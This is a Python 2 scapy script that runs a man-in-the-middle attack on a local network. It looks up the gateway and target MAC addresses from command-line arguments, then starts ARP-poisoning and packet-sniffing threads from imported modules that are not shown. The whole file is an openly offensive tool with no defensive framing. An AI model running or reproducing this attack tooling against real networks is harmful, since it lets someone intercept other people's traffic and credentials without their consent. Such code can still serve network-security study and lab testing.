#!/usr/bin/env python
from scapy.all import *
from PacketSniffer import *
from ARPPoisoner import *
import sys,time

def get_mac_by_ip(ip):
	ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="who-has",pdst=ip),timeout=2, verbose=False)
	if(len(ans) > 0 ):
		return ans[0][1].src
	else:
		return False

def parse_input():
	if len(sys.argv) < 2 :
		print "Error"
	elif sys.argv[1] in ["-a","--all"]:
		print "ALL"
	elif sys.argv[1] in ["-t","--targets"]:
		for i in range(2,len(sys.argv)):
			target = sys.argv[i]
			target_mac = get_mac_by_ip(target)
			if(target_mac == False):
				print "Couldn't get the MAC address of %s" % i
			else:
				targets.append( [target,target_mac ] )
		man_in_the_middle()
	elif sys.argv[1] in ["-h","--help"]:
		print " --all | --targets target target target"

def man_in_the_middle():
	global packet_sniffer_thread,arp_poisoner_thread,gateway_ip,targets,gateway_mac,interface
	if len(targets) > 0:
		print "Your Ip : " + my_ip
		print "Your MAC : " + my_mac
		print "gateway_ip Ip : " + gateway_ip
		print "gateway_mac Ip : " + gateway_mac
		print "Targets : " + str(targets)
		print "Starting .."
		arp_poisoner_thread = ARPPoisoner(targets,gateway_ip)
		packet_sniffer_thread = PacketSniffer(targets,gateway_mac,interface)
		arp_poisoner_thread.start()
		packet_sniffer_thread.start()
	else:
		print "No Targets"

if __name__ == "__main__":
	global targets,my_ip,gateway_ip,interface,my_mac,gateway_mac
	targets = []
	for i in read_routes():
		if i[0] == 0:
			my_ip = i[4]
			gateway_ip = i[2]
			interface = i[3]
	my_mac = get_if_hwaddr(interface)
	gateway_mac = get_mac_by_ip(gateway_ip)
	parse_input()
	while 1:
		x = raw_input()
		if x == "exit":
			exit()


		
